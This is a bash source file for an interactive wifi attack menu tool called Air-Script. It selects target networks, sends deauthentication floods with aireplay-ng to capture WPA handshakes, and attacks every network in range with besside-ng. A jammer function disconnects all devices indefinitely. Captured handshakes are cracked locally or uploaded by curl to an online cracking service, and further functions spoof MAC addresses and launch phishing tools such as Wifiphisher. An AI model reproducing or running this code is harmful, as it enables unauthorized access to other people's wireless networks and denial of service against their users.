#!/bin/bash


# Ensure we are being ran as root
if [ $(id -u) -ne 0 ]; then
	echo "This script must be ran as root"
	exit 1
fi
network () {
echo "Please, select a network interface:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
airmon-ng start $foo > /dev/null 2>&1
echo "Please, select the interface in monitor mode:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
cd /home/*/air-script
}
chmod -R 755 *
sudo postfix start > /dev/null 2>&1
sudo systemctl start postfix > /dev/null 2>&1
clear
Red="\e[1;91m"      ##### Colors Used #####
Green="\e[0;92m"
Yellow="\e[0;93m"
Blue="\e[1;94m"
White="\e[0;97m"

handshakeWait=2        ##### Time, how long aircack-ng waits for handshake in minute #####

checkDependencies () {        ##### Check if aircrack-ng is installed or not #####
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
echo "Installing aircrack-ng\n\n"
apt-get install -y aircrack-ng;
fi
}

checkWiFiStatus () {        ##### Check if $foo is enabled or not #####
WiFiStatus=`nmcli radio wifi`
if [ "$WiFiStatus" == "disabled" ]; then
nmcli radio wifi on
echo -e "[${Green}$foo${White}] Enabled!"
fi
#stopMon > /dev/null 2>&1
checkServices > /dev/null 2>&1


}


checkServices () {
sudo systemctl restart postfix > /dev/null 2>&1
sudo postfix restart > /dev/null 2>&1
sudo systemctl restart postfix > /dev/null 2>&1
sudo systemctl start postfix > /dev/null 2>&1
sudo postfix start > /dev/null 2>&1
sudo systemctl start postfix > /dev/null 2>&1



}
banner () {        ##### Banner #####
    echo -e "${Red}                    __   __   __   __     __  ___    "
    echo -e "${Red}             /\  | |__) /__\` /  \` |__) | |__)  |     "
    echo -e "${Red}            /~~\\ | |  \\ .__/ \\__, |  \\ | |     |     "

    #echo -e "${Yellow} \n                     Hack the world!!!     "
    echo -e "${Green}\n   [Version: 2.0.6 Stable] Developed by: Liam Bendix"
  
}
menu () {        ##### Display available options in two columns #####
    echo -e "\n${Yellow}               [ Select Option To Continue ]\n\n"
    
    # First column
    echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack Wifi             ${Red}[${Blue}6${Red}] ${Green}View log file"
    echo -e "      ${Red}[${Blue}2${Red}] ${Green}Decrypt Password(s)   ${Red}[${Blue}7${Red}] ${Green}Extra Tools"
    echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifi Jammer           ${Red}[${Blue}8${Red}] ${Green}Help"
    echo -e "      ${Red}[${Blue}4${Red}] ${Green}Change MAC Address    ${Red}[${Blue}9${Red}] ${Green}Exit"
    echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change IP Address\n"
    
    while true; do
        echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
        read -p "└─────►$(tput setaf 7) " option
        case $option in
            1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
               wifiHacking
               ;;
            2) echo -e "\n[${Green}Selected${White}] Option 2 Decrypt Passowrd(s).."
               crack
               exit 0
               ;;
            3) echo -e "\n[${Green}Selected${White}] Option 3 Wifi Jammer..."
               wifiJammer
               exit 0
               ;;
            4) echo -e "\n[${Green}Selected${White}] Option 4 Changing MAC Address..."
               macChange
               exit 0
               ;;
            5) echo -e "\n[${Green}Selected${White}] Option 5 Anonsurf..."
               anonsurf
               exit 0
               ;;
            6) echo -e "\n[${Green}Selected${White}] Option 6 View log of cracked networks..."
               log
               exit 0
               ;;
            7) echo -e "\n[${Green}Selected${White}] Option 7 Extra Tools..."
               tools
               exit 0
               ;;
            8) echo -e "\n[${Green}Selected${White}] Option 8 Help..."
               Help
               exit 0
               ;;
            9) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
               exit 0
               ;;
            *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
               ;;
        esac
    done
}
wifiHacking () {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Air-Script Attacks"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Fluxion Attacks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifite Attacks"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Wifite2 Attacks"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Wifiphisher Attacks"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Fern Attacks"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Airogeddon Attacks"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Air Script Attacks.."
     AirScriptMenu
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Fluxion.."
     FluxionMenu
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Wifite.."
     Wifite
     exit 0
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Wifite2.."
     Wifite2
     exit 0
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Wifiphisher.."
     StartWifiphisher
     exit 0
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 Fern.."
     Fern
     exit 0
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Airgeddon.."
     airogeddon
     exit 0
     ;;
  8) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


 AirScriptMenu() {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Network"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Networks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Decrypt Passowrd"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Network.."
     AirScript
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Networks.."
     attackAll
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Crack Password.."
     crack
     exit 0
     ;;
  4) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}



AirScript() {
notification
}


notification () {
while true; do
    read -p "Do you want to recive email notifications when it's done pwning?" yn
    case $yn in
        [Yy]* ) attackYes; break;;
        [Nn]* ) attackNo;;
        * ) echo "Please answer yes or no.";;
    esac
done
}


attackYes () {
echo "Enter your email address for notifications: " email
read email
echo "Remember to check your spam folder!"
sleep 3
network
monitor
airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
echo -e "[${Green}${foo}${White}] Sending DeAuth to target..."
xterm -e aireplay-ng --deauth 20 -a $bssid $foo
echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
check_cap_files
sleep 3
pkill -9 xterm
echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
crack
}


attackNo () {
    network
    monitor
airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
echo -e "[${Green}${foo}${White}] Sending DeAuth to target..."
xterm -e aireplay-ng --deauth 20 -a $bssid $foo
echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
check_cap_files
pkill -9 xterm
crack
}

wordlist () {        ##### Enter path to wordlist or use default #####
read -p $'[\e[0;92mInput\e[0;97m] Path to wordlist (Press enter to use default): ' fileLocation
if [ -z "$fileLocation" ]; then
fileLocation="${parameter:-dictionary/defaultWordList.txt}"
return 0
elif [[ -f "$fileLocation" ]]; then
return 0
fi
echo -e "[${Red}!$White] File doesn't exist..."
wordlist

}









notification1 () {
while true; do
    read -p "Do you want to recive email notifications when it's done pwning?" yn
    case $yn in
        [Yy]* ) attackAllYes; break;;
        [Nn]* ) attackAllNo;;
        * ) echo "Please answer yes or no.";;
    esac
done
}


attackAll() {
notification1
}


attackAllYes() {
    echo "Enter your email address for notifications: "
    read email
    sleep 3
    echo "Remember to check your spam folder!"
    network
    clear
  
    # Run Besside-ng to capture handshakes from all Wi-Fi networks in range
    echo -e "${Green}Starting Besside-ng to capture WPA handshakes from all networks in range..."
    besside-ng $foo

    # Once Besside-ng completes (or captures a handshake), it will stop and output results
    echo -e "${Green}Handshakes capture complete. Saved in ~/handshakes/"
    stopMon 
    echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
}



attackAllNo () {
    network
    # Run Besside-ng to capture handshakes from all Wi-Fi networks in range
    echo -e "${Green}Starting Besside-ng to capture WPA handshakes from all networks in range..."
    besside-ng $foo

    # Once Besside-ng completes (or captures a handshake), it will stop and output results
    echo -e "${Green}Handshakes capture complete. Saved in ~/handshakes/"
    stopMon 
    crack
}








FluxionMenu() {
cd /tools
cd fluxion
sudo ./fluxion.sh
}

Wifite () {
sudo wifite
}

Wifite2 () {
wifite
cd /tools
cd wifite2
sudo ./Wifite.py
}


crack () {
echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
cleanup 
crack_hashes
}

#!/bin/bash

# Function to convert .cap file to .hccapx
convert_cap_to_hccapx() {
    # Check if hcxpcaptool is installed
    if ! command -v hcxpcaptool &> /dev/null
    then
        echo "hcxpcaptool could not be found. Please install it first."
        exit 1
    fi

    # Ensure the correct number of arguments is provided
    if [ $# -ne 1 ]; then
        echo "Usage: $0 <path-to-cap-file>"
        exit 1
    fi

    # Input file (.cap)
    cap_file="$1"

    # Check if the file exists and is a .cap file
    if [ ! -f "$cap_file" ]; then
        echo "File $cap_file not found!"
        exit 1
    fi

    if [[ "$cap_file" != *.cap ]]; then
        echo "Please provide a .cap file!"
        exit 1
    fi

    # Output file name (same as input file but with .hccapx extension)
    hccapx_file="${cap_file%.cap}.hccapx"

    # Convert the .cap file to .hccapx using hcxpcaptool
    echo "Converting $cap_file to $hccapx_file..."
    hcxpcaptool -z "$hccapx_file" "$cap_file"

    if [ $? -eq 0 ]; then
        echo "Conversion successful: $hccapx_file"
    else
        echo "Conversion failed!"
        exit 1
    fi
}

# Function to crack hashes locally or via cloud
crack_hashes() {
    # Ask user for input method
    echo "Do you want to crack hashes on your device or with the cloud?"
    select method in "Local (Device)" "Cloud (OnlineHashCrack)"; do
        case $method in
            "Local (Device)")
                # Local cracking with Hashcat or other methods (you can extend this part)
                echo "You have selected local cracking."
                echo "Your current directory:"
                pwd
                ls *.txt
                read -p "Enter path to wordlist : " wordlist
                $wordlist
                sudo aircrack-ng -w $wordlist *.cap 
                break
                ;;
            "Cloud (OnlineHashCrack)")
                # Ask for the user's email for cloud cracking
                echo "Please provide your email for OnlineHashCrack service:"
                read -p "Email: " user_email

                if [[ -z "$user_email" ]]; then
                    echo "Email cannot be empty. Exiting."
                    exit 1
                fi

                # Convert the cap file to hccapx format
                echo "Please provide the path to your .cap file:"
                read -p "Path to .cap file: " cap_file

                # Call the conversion function
                convert_cap_to_hccapx "$cap_file"
                hccapx_file="${cap_file%.cap}.hccapx"

                # Upload to OnlineHashCrack
                echo "Uploading $hccapx_file to OnlineHashCrack..."
                response=$(curl -s -X POST https://www.onlinehashcrack.com/crack-wpa/ \
                    -F "email=$user_email" \
                    -F "file=@$hccapx_file" \
                    -F "hash_type=wpa" \
                    -F "submit=Submit")

                # Check the response for success or failure
                if [[ "$response" == *"Cracking started"* ]]; then
                    echo "Cracking request submitted successfully."
                else
                    echo "Error submitting your request. Please try again."
                    exit 1
                fi
                break
                ;;
            *)
                echo "Invalid option. Please select either 'Local' or 'Cloud'."
                ;;
        esac
    done
}



# Function to convert .cap file to .hccapx
convert_cap_to_hccapx() {
    # Check if hcxpcaptool is installed
    if ! command -v hcxpcaptool &> /dev/null
    then
        echo "hcxpcaptool could not be found. Please install it first."
        exit 1
    fi

    # Ensure the correct number of arguments is provided
    if [ $# -ne 1 ]; then
        echo "Usage: $0 <path-to-cap-file>"
        exit 1
    fi

    # Input file (.cap)
    cap_file="$1"

    # Check if the file exists and is a .cap file
    if [ ! -f "$cap_file" ]; then
        echo "File $cap_file not found!"
        exit 1
    fi

    if [[ "$cap_file" != *.cap ]]; then
        echo "Please provide a .cap file!"
        exit 1
    fi

    # Output file name (same as input file but with .hccapx extension)
    hccapx_file="${cap_file%.cap}.hccapx"

    # Convert the .cap file to .hccapx using hcxpcaptool
    echo "Converting $cap_file to $hccapx_file..."
    hcxpcaptool -z "$hccapx_file" "$cap_file"

    if [ $? -eq 0 ]; then
        echo "Conversion successful: $hccapx_file"
    else
        echo "Conversion failed!"
        exit 1
    fi
}


cleanup () {
#$sudo airmon-ng stop $foo
#checkDependencies
#checkWiFiStatus
#checkServices
sudo rm -f *.csv > /dev/null 2>&1
sudo rm -f *.netxml > /dev/null 2>&1
sudo rm -f airodump_output.log > /dev/null 2>&1
sudo rm -f *.ivs > /dev/null 2>&1
cleanup_handshakes
exit

}


cleanup_handshakes() {
  # Check if the handshakes folder exists, if not create it
  if [ ! -d "handshakes" ]; then
    echo "Creating handshakes directory..."
    mkdir handshakes
  fi

  # Find and move all .cap files to the handshakes directory
  echo "Renaming and moving .cap files to handshakes folder..."

  # Iterate over all .cap files and move them to the handshakes folder with a timestamp
  for cap_file in *.cap; do
    if [ -f "$cap_file" ]; then  # Ensure it's a valid file
      # Generate a timestamp in the format YYYY-MM-DD_HH-MM-SS
      timestamp=$(date +"%Y-%m-%d_%H-%M-%S")
      
      # Create a new filename with the timestamp
      new_file="handshakes/${timestamp}_$(basename "$cap_file")"
      
      # Rename and move the file
      echo "Renaming $cap_file to $new_file"
      mv "$cap_file" "$new_file"
    fi
  done

  # Confirm the cleanup is done
  echo "Cleanup complete. All .cap files renamed and moved to handshakes."
}


StartWifiphisher () {
wifiphisher

}

Fern () {
sudo fern-wifi-cracker
}


airogeddon () {
cd /tools
cd airgeddon
sudo bash airgeddon.sh
}


wifiJammer () {        ##### Sending unlimited DeAuth #####
monitor
airodump-ng --bssid $bssid --channel $channel $foo > /dev/null & sleep 5 ; kill $!  
echo -e "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
sleep 0.5
echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
aireplay-ng --deauth 0 -a $bssid $foo > /dev/null
}


# Function to capture MAC addresses and process them
captureMAC() {
  # Ensure the script is running with root privileges
  if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root"
    return 1
  fi

  # Parse input arguments
  while getopts "c:b:f:" opt; do
    case "$opt" in
      c) channel="$OPTARG" ;;
      b) bssid="$OPTARG" ;;
      f) foo="$OPTARG" ;;
      *) echo "Usage: $0 -c <channel> -b <BSSID> -f <interface>"; return 1 ;;
    esac
  done

  # Validate input parameters
  if [ -z "$channel" ] || [ -z "$bssid" ] || [ -z "$foo" ]; then
    echo "Usage: $0 -c <channel> -b <BSSID> -f <interface>"
    return 1
  fi

  # Check if the provided interface is already in monitor mode
  if ! iw dev "$foo" info | grep -q "type monitor"; then
    echo "$foo is not in monitor mode. Please make sure the interface is in monitor mode."
    return 1
  fi

  # Create a temporary capture file to store output
  capture_file="capture_$bssid"

  # Start airodump-ng with timeout handling
  echo "Capturing data on channel $channel for AP $bssid using interface $foo..."

  # Print the interface status for debugging
  iw dev "$foo" info

  # Start airodump-ng in the background and capture its process ID
  airodump-ng --channel "$channel" --bssid "$bssid" --write "$capture_file" "$foo" > airodump_output.log 2>&1 &
  airodump_pid=$!

  # Wait for 30 seconds before killing the process
  sleep 30

  # Check if airodump-ng is still running, and kill it if necessary
  if kill -0 $airodump_pid 2>/dev/null; then
    echo "Timeout reached. Killing airodump-ng process..."
    kill $airodump_pid
  else
    echo "airodump-ng process already completed."
  fi

  # Wait for airodump-ng to terminate (if not already terminated)
  wait $airodump_pid

  # Check if airodump-ng successfully created a capture file
  if [ ! -f "${capture_file}-01.csv" ]; then
    echo "Failed to capture any data or the capture file does not exist."
    echo "Check the log file airodump_output.log for errors."
    return 1
  fi

  # Extract the MAC addresses of connected clients and stations
  echo "Extracting client and station MAC addresses associated with BSSID $bssid..."

  # Extract station MAC addresses using grep and awk (station list from CSV file)
  echo "Station MAC addresses:"
  awk -F, -v bssid="$bssid" '$1 == bssid {print $1}' "${capture_file}-01.csv" | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' | sort | uniq

  # Extract associated client MAC addresses using grep and awk (client list from CSV file)
  echo "Client MAC addresses:"
  awk -F, -v bssid="$bssid" '$1 == bssid {print $1}' "${capture_file}-01.csv" | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' | sort | uniq | while read client; do
    echo "Client MAC: $client"
  done

  # Clean up capture files
 # rm -f "${capture_file}"*

  echo "Script completed successfully. Monitor mode was not disabled."
}

# Example usage of the captureMAC function
# You would call the function with the correct parameters like this:
# captureMAC -c 11 -b 94:6A:77:2D:2A:6E -f wlan0

# Example usage of the captureMAC function
# You would call the function with the correct parameters like this:
# captureMAC -c 6 -b XX:XX:XX:XX:XX:XX -f wlan0




monitor() {
    #foo="wlan0"   # Example interface, replace with the correct one if needed
   airmon-ng check kill
    # Check if the interface exists
    if ! iwconfig $foo > /dev/null 2>&1; then
        echo "Interface $foo not found. Please check your device."
        exit 1
    fi

    # Start monitor mode (check if this works before continuing)
#    echo "Starting monitor mode on $foo..."
 #   airmon-ng start $foo > /dev/null 2>&1
  #  if [ $? -ne 0 ]; then
   #     echo "Failed to start monitor mode on $foo. Please check your device."
    #    exit 1
    #fi
# Start monitor mode (check if this works before continuing)
echo -e "\e[32m[Starting monitor mode on $foo...]\e[0m"
airmon-ng start $foo > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo -e "\e[31mFailed to start monitor mode on $foo. Please check your device.\e[0m"
    exit 1
fi
    # Set up a cleanup trap
    trap "airmon-ng stop $foo > /dev/null; rm -f generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT

    # Run airodump-ng in background and redirect output
    echo "Starting airodump-ng scan on $foo..."
    airodump-ng --output-format kismet --write generated $foo > /dev/null & 
    airodump_pid=$!   # Capture PID of airodump-ng
    sleep 20

    # Check if the airodump-ng process is still running
    if ps -p $airodump_pid > /dev/null; then
        echo "Killing airodump-ng process..."
        kill $airodump_pid
    else
        echo "airodump-ng process already stopped."
    fi

    # Check if the CSV file was created
    if [ ! -f "generated-01.kismet.csv" ]; then
        echo "Error: generated-01.kismet.csv not found. Is airodump-ng running correctly?"
        exit 1
    fi

    # Remove the header from the CSV
    sed -i '1d' generated-01.kismet.csv

    # Debugging: Print out the first few rows of the CSV to ensure we're capturing the correct columns
    echo -e "\n\n${Red}CSV Raw Data (First 5 lines)${White}:"
    head -n 5 generated-01.kismet.csv

    # Print the available networks (SSID and BSSID) for the user to select
    echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
    awk -F ";" '{gsub(/^[ \t]+|[ \t]+$/, "", $3); gsub(/^[ \t]+|[ \t]+$/, "", $4); print NR, $3, $4}' generated-01.kismet.csv | nl -n ln -w 8

    # Get the number of networks in the file
    total_networks=$(wc -l < generated-01.kismet.csv)
    if [ -z "$total_networks" ] || [ "$total_networks" -eq 0 ]; then
        echo "No networks found. Please check if airodump-ng is running correctly."
        exit 1
    fi

    # Prompt user to select a target network
    targetNumber=1000
    while [ ${targetNumber} -gt ${total_networks} ] || [ ${targetNumber} -lt 1 ]; do 
        echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
        read -p "└─────►$(tput setaf 7) " targetNumber
    done

   # Extract network details using awk with whitespace handling
targetName=$(awk -F ';' "NR==${targetNumber} {print \$3}" generated-01.kismet.csv | xargs)
bssid=$(awk -F ';' "NR==${targetNumber} {print \$4}" generated-01.kismet.csv | xargs)
channel=$(awk -F ';' "NR==${targetNumber} {print \$6}" generated-01.kismet.csv | xargs)

# Output the selected target
echo -e "\n${Green}You have selected the following network:${White}"
echo -e "${Green}SSID:${White} ${targetName}"
echo -e "${Green}BSSID:${White} ${bssid}"
echo -e "${Green}Channel:${White} ${channel}"

# Set the wifi card to the target channel
sudo iwconfig $foo channel $channel

    # Check if BSSID is empty, and alert the user if necessary
    if [ -z "$bssid" ]; then
        echo -e "${Red}Error: Invalid BSSID. Please try again with a valid target network.${White}"
        exit 1
    fi

    # Clean up the CSV file
    rm generated-01.kismet.csv 2> /dev/null

    # Confirm that we are preparing for the attack
    echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
}




networkselect () {
echo "Please, select a network interface:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done

}



# Function to check if EAPOL frames exist in a .cap file
check_eapol_in_cap() {
    local cap_file=$1
    if tshark -r "$cap_file" -Y "eapol" | grep -q "EAPOL"; then
        echo "EAPOL data found in $cap_file"
        return 0
    else
        echo "No EAPOL data found in $cap_file"
        return 1
    fi
}

# Function to check if .cap files exist and verify EAPOL frames
check_cap_files() {
    # Clear the screen
    #clear

    # Check if any .cap files exist in the current directory
    if ls *.cap &> /dev/null; then
        # .cap files are present
        echo -e "\e[32m[SUCCESS] .cap files found.\e[0m"  # Green text
        
        # Loop through each .cap file to check for EAPOL frames
        for cap_file in *.cap; do
            echo -e "\nChecking $cap_file for EAPOL frames..."
            if check_eapol_in_cap "$cap_file"; then
                echo -e "\e[32m[EAPOL Found]\e[0m Proceeding with cracking."
                
                # Turn off monitor mode silently
                echo "Turning off monitor mode..."
                sudo airmon-ng stop wlan0mon > /dev/null 2>&1
                sudo airmon-ng stop wlp7s0mon > /dev/null 2>&1
                sudo systemctl start NetworkManager > /dev/null 2>&1
                echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
                # Now proceed with cracking
                crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
                return 0  # Stop after finding a valid file with EAPOL
            else
                echo -e "\e[31m[EAPOL Not Found]\e[0m Skipping file."
            fi
        done
        
        # If no valid .cap files with EAPOL are found, exit
        echo -e "\e[31mNo valid .cap files with EAPOL data found. 0 Handshakes captured. Trying again...\e[0m"
        deauthAttack
    else
        # No .cap files found
        echo -e "\e[31m[FAILED] No .cap files found.\e[0m"  # Red text
        sleep 3
        deauthAttack
    fi

}

deauthAttack () {
sudo rm -rf *.cap
sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
recon
# Ensure recon is done and client was found before proceeding to the next steps
if [ "$client_found" = true ]; then
    sleep 4
xterm -e aireplay-ng -0 50 -a $bssid -c $client $foo
sleep 2
check_cap_files
    echo -e "\e[32m[Proceeding with next steps]\e[0m"
else
    echo -e "\e[31m[Recon failed to find a client, aborting subsequent steps.]\e[0m"
    exit 1
fi
 } 



recon() {
    retries=0
    max_retries=5  # Define the number of retries
    client_found=false  # Flag to check if client is found

    while [ $retries -lt $max_retries ]; do
        echo -e "\e[32m[Scanning for clients...]\e[0m"  # Green text for scanning message

        # Start airodump-ng with sudo for permission
        xterm -hold -e "sudo airodump-ng --bssid $bssid --channel $channel --output-format csv --write client $foo && sleep 60 && exit" &

        # Allow 60 seconds for the capture file to populate (increased wait time)
        echo "Waiting for 60 seconds for airodump to capture data..."
        sleep 60

        # Check if the capture CSV file exists and contains data
        if [ ! -f "client-01.csv" ]; then
            echo -e "\e[31mError: client-01.csv not found. Airodump-ng may not have captured any data.\e[0m"
            retries=$((retries + 1))
            echo -e "\e[31m[Retrying... ($retries/$max_retries)]\e[0m"
            sleep 5  # Delay before retrying
            continue
        fi

        # Remove lines that match the BSSID from the client-01.csv file and save to a temporary file using awk
        echo -e "\e[32m[Filtering out BSSID from client-01.csv...]\e[0m"
        awk -F',' -v bssid="$bssid" '
        BEGIN {
            print_header = 1
        }
        {
            if (print_header) {
                print $0
                print_header = 0
            } else if ($1 != bssid && $1 != "Station MAC" && $1 != "" && length($1) == 17) {
                print $0
            }
        }' client-01.csv > client_filtered.csv

        # Extract the client MAC addresses from the filtered CSV file
        echo -e "\e[32m[Client MAC addresses found in client_filtered.csv]:\e[0m"
        
        # Read through the filtered CSV file to find client MACs
        while IFS=',' read -r station_mac first_time last_time power packet_count bssid probed_essid; do
            # Skip the header or rows with empty station_mac, and ensure it's not the BSSID
            if [[ -n "$station_mac" && "$station_mac" != "Station MAC" && "$station_mac" != "$first_time" && "$station_mac" != "$bssid" && "${#station_mac}" == 17 ]]; then
                client=$station_mac  # Correctly assign to $client
                client_found=true
                echo -e "\e[32m[Client found: $client]\e[0m"  # Green text for client found
                break
            fi
        done < <(tail -n +2 client_filtered.csv)  # Skip header row using tail

        # If client found, break out of the retry loop
        if [ "$client_found" = true ]; then
            break  # Exit the loop after client is found
        else
            retries=$((retries + 1))
            echo -e "\e[31m[Retrying... ($retries/$max_retries)]\e[0m"
            sleep 5  # Delay before retrying
        fi
    done

    # If no client is found after max retries, exit with an error
    if [ "$client_found" = false ]; then
        echo -e "\e[31m[Failed to capture client after $max_retries retries. Exiting...]\e[0m"
        rm client_filtered.csv
        exit 1
    fi

    # Now handle the .cap file
    echo "Waiting for capture file to be available..."

    # Check for any .cap file in the directory (not just client-01.cap)
    for ((i=0; i<5; i++)); do
        # List files in the directory for debugging
        echo "Listing .cap files in the directory..."
        ls *.cap

        # Check if any .cap file exists
        if ls *.cap 1> /dev/null 2>&1; then
            # Move the first .cap file found
            cap_file=$(ls *.cap | head -n 1)
            sudo mv "$cap_file" client.cap
            echo -e "\e[32m[Capture file renamed to client.cap]\e[0m"
            break
        else
            echo "Capture file not found, retrying... ($((i+1))/5)"
            sleep 3  # Delay before retrying
        fi
    done

    # Check if the file was successfully renamed
    if [ -f "client.cap" ]; then
        echo -e "\e[32m[Capture file successfully renamed.]\e[0m"
    else
        echo -e "\e[31m[Error: .cap file not found after retries.]\e[0m"
        exit 1
    fi
}


macChange() {
     ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Change MAC Address"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Restore Original MAC Address"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Show Current MAC Address"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Changing MAC Address..."
     spoofMAC
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Restore MAC Address.."
     RestoreMAC
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Current MAC Address.."
     showMAC
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


spoofMAC(){
networkselect
macchanger -s $foo
sudo ifconfig $foo down
sudo macchanger -r $foo
sudo ifconfig $foo up
macchanger -s $foo
menu
}

RestoreMAC(){
networkselect
sudo ifconfig $foo down
sudo macchanger -p $foo
sudo ifconfig $foo up
sudo macchanger -s $foo
menu
}

showMAC() {
networkselect
macchanger -s $foo
macChange


}





anonsurf (){ 
       ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Start Anonsurf"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Show Anonsurf Status"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Stop Anonsurf"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Restart Anonsurf"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change TOR Identity"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Start i2p Services"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Stop i2p Services"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Show Current IP Address"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Start Anonsurf"
     anonsurfStart
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Show Anonsurf Status"
     anonsurfStatus
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Stop Anonsurf"
     anonsurfStop
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Restart Anonsurf"
     anonsurfRestart
     exit 0
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Changeing Identity Restarting TOR"
     anonsurfChange
     exit 0
     ;; 
  6) echo -e "\n[${Green}Selected${White}] Start i2p Services"
     anonsurfStarti2p
     exit 0
     ;; 
  7) echo -e "\n[${Green}Selected${White}] Stop i2p Services"
     anonsurfStopi2p
     exit 0
     ;; 
  8) echo -e "\n[${Green}Selected${White}] Show your current IP address"
     anonip
     exit 0
     ;; 
  9) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


